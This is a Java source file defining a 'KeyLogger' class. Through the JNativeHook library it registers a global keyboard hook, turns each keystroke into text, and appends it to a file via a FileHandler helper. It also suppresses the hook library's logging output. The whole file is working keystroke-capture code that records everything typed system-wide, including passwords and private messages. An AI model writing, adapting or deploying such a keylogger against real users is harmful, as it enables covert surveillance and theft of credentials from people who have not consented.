package Main;

import java.util.logging.Logger;
import java.util.logging.Level;
import java.util.logging.LogManager;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends Thread implements NativeKeyListener {
 
	private FileHandler fileHandler;
	
	public KeyLogger() {
		fileHandler = FileHandler.getInstance();
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
		String convertedKey = convertKey(keyPressed);
		System.out.println(convertedKey);
		fileHandler.appendToFile(convertedKey);
	}
	
    public void initializeKeyListener() {
    	disableConsoleLogger();
        try {
            GlobalScreen.registerNativeHook();
        } 
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
	
    public void disableConsoleLogger() {
    	LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false); 
    }

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
	
	public String convertKey(String keyPressed){
		switch(keyPressed) {
			case "Space" :
				keyPressed = " ";
				break;
			case "Period" :
				keyPressed = ".";
				break;
			case "Comma" :
				keyPressed = ",";
				break;
			case "Slash" :
				keyPressed = "/";
				break;
			case "Back Slash" :
				keyPressed = "\\";
				break;
			case "Minus" :
				keyPressed = "-";
				break;
			case "Equals" :
				keyPressed = "=";
				break;
			case "Quote" :
				keyPressed = "'";
				break;
			case "Backspace" :
				keyPressed = "";
				break;
			case "Shift" :
				keyPressed = "";
				break;
			case "Ctrl" :
				keyPressed = "";
				break;
		}
		return keyPressed;
	}
	
}



